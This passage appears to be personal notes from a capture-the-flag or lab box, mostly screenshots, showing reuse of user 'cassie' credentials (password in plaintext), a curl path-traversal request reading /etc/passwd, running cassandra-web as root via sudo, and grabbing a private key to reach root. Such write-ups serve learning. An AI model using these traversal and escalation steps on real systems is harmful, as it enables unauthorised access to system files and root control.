
![Pasted image 20240622143117.png](Evidence/Pasted%20image%2020240622143117.png)

lets try to use our creds for cassie 

![Pasted image 20240622143324.png](Evidence/Pasted%20image%2020240622143324.png)

![Pasted image 20240622144200.png](Evidence/Pasted%20image%2020240622144200.png)

![Pasted image 20240622144633.png](Evidence/Pasted%20image%2020240622144633.png)

```
curl --path-as-is http://TARGET:3000/../../../../../../../../etc/passwd
```

![Pasted image 20240622145145.png](Evidence/Pasted%20image%2020240622145145.png)

```
sudo -u root /usr/local/bin/cassandra-web -B 0.0.0.0:9999 -u cassie -p SecondBiteTheApple330
```

It's hosting off of any interface at port 9999

but we can only access it locally on the target system unless we port forward but that wont be necessary. 

![Pasted image 20240622150409.png](Evidence/Pasted%20image%2020240622150409.png)

so I went after anthony's private key!

So I cant ssh in with anthonys private key I cant even get into ssh2john 

but I can ssh in as root....................

werid.......

![Pasted image 20240622150917.png](Evidence/Pasted%20image%2020240622150917.png)

